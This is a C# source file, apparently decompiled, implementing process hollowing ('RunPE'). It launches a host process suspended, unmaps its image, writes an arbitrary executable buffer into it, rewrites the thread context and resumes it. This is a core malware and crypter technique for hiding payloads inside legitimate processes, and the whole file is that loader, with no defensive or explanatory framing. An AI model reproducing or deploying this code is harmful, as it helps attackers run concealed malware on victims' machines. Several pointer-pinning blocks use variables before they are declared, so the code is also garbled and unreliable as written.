using System;
using System.Runtime.InteropServices;

public class CMemoryExecute
{
    private const uint CONTEXT_FULL = 0x10007;
    private const int CREATE_SUSPENDED = 4;
    private const ushort IMAGE_DOS_SIGNATURE = 0x5a4d;
    private const uint IMAGE_NT_SIGNATURE = 0x4550;
    private const int MEM_COMMIT = 0x1000;
    private const int MEM_RESERVE = 0x2000;
    private const int PAGE_EXECUTE_READWRITE = 0x40;

    [DllImport("kernel32.dll", SetLastError=true)]
    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, byte[] lpStartupInfo, int[] lpProcessInfo);
    [DllImport("ntdll.dll", SetLastError=true)]
    private static extern int NtGetContextThread(IntPtr hThread, IntPtr lpContext);
    [DllImport("ntdll.dll", SetLastError=true)]
    private static extern uint NtResumeThread(IntPtr hThread, IntPtr SuspendCount);
    [DllImport("ntdll.dll", SetLastError=true)]
    private static extern int NtSetContextThread(IntPtr hThread, IntPtr lpContext);
    [DllImport("ntdll.dll", SetLastError=true)]
    private static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);
    [DllImport("ntdll.dll", SetLastError=true)]
    private static extern int NtWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, IntPtr lpNumberOfBytesWritten);
    public unsafe bool Run(byte[] exeBuffer, string hostProcess, string optionalArguments = "")
    {
        byte* numPtr;
        byte[] dst = new byte[40];
        byte[] buffer2 = new byte[0xf8];
        byte[] buffer3 = new byte[0x40];
        int[] lpProcessInfo = new int[4];
        byte[] buffer4 = new byte[0x2cc];
        fixed (byte* numRef = dst)
        {
            numPtr = numRef;
            numRef2 = buffer2;
        }
        byte* numPtr2 = numRef2;
        fixed (byte* numRef2 = null)
        {
            byte* numPtr3;
            fixed (byte* numRef3 = buffer3)
            {
                numPtr3 = numRef3;
                numRef4 = buffer4;
            }
            byte* numPtr4 = numRef4;
            fixed (byte* numRef4 = null)
            {
                *((int*) numPtr4) = 0x10007;
                Buffer.BlockCopy(exeBuffer, 0, buffer3, 0, buffer3.Length);
                if (*(((ushort*) numPtr3)) != 0x5a4d)
                {
                    return false;
                }
                int srcOffset = *((int*) (numPtr3 + 60));
                Buffer.BlockCopy(exeBuffer, srcOffset, buffer2, 0, buffer2.Length);
                if (*(((uint*) numPtr2)) != 0x4550)
                {
                    return false;
                }
                if (!string.IsNullOrEmpty(optionalArguments))
                {
                    hostProcess = hostProcess + " " + optionalArguments;
                }
                if (!CreateProcess(null, hostProcess, IntPtr.Zero, IntPtr.Zero, false, 4, IntPtr.Zero, null, new byte[0x44], lpProcessInfo))
                {
                    return false;
                }
                IntPtr lpBaseAddress = new IntPtr(*((int*) (numPtr2 + 0x34)));
                NtUnmapViewOfSection((IntPtr) lpProcessInfo[0], lpBaseAddress);
                if (VirtualAllocEx((IntPtr) lpProcessInfo[0], lpBaseAddress, *((uint*) (numPtr2 + 80)), 0x3000, 0x40) == IntPtr.Zero)
                {
                    this.Run(exeBuffer, hostProcess, optionalArguments);
                }
                fixed (byte* numRef5 = exeBuffer)
                {
                    NtWriteVirtualMemory((IntPtr) lpProcessInfo[0], lpBaseAddress, (IntPtr) numRef5, *((uint*) (numPtr2 + 0x54)), IntPtr.Zero);
                }
                for (ushort i = 0; i < *(((ushort*) (numPtr2 + 6))); i = (ushort) (i + 1))
                {
                    Buffer.BlockCopy(exeBuffer, (srcOffset + buffer2.Length) + (dst.Length * i), dst, 0, dst.Length);
                    fixed (byte* numRef6 = &(exeBuffer[*((uint*) (numPtr + 20))]))
                    {
                        NtWriteVirtualMemory((IntPtr) lpProcessInfo[0], (IntPtr) (((int) lpBaseAddress) + *(((uint*) (numPtr + 12)))), (IntPtr) numRef6, *((uint*) (numPtr + 0x10)), IntPtr.Zero);
                    }
                }
                NtGetContextThread((IntPtr) lpProcessInfo[1], (IntPtr) numPtr4);
                NtWriteVirtualMemory((IntPtr) lpProcessInfo[0], (IntPtr) *(((uint*) (numPtr4 + 0xac))), lpBaseAddress, 4, IntPtr.Zero);
                *((int*) (numPtr4 + 0xb0)) = ((int) lpBaseAddress) + *(((uint*) (numPtr2 + 40)));
                NtSetContextThread((IntPtr) lpProcessInfo[1], (IntPtr) numPtr4);
                NtResumeThread((IntPtr) lpProcessInfo[1], IntPtr.Zero);
                return true;
            }
        }
    }

    [DllImport("kernel32.dll", SetLastError=true)]
    private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
}

